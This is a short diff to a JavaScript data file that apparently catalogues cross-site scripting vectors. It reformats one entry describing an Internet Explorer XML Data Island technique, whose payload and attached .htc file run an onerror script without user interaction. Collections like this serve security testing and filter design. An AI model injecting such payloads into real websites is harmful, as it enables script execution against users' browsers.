@@ -1648,13 +1648,13 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<xml id="xss" src="%htc_path%"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
+        'data'       : '<xml id="xss" src="%htc_path%"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
             'path'          : '',
             'name'          : 'test.htc',
-            'raw'           : '<?xml version="1.0"?><x><payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload></x>'
+            'raw'           : '<?xml version="1.0"?><x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
         },        
         'description': {
             'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
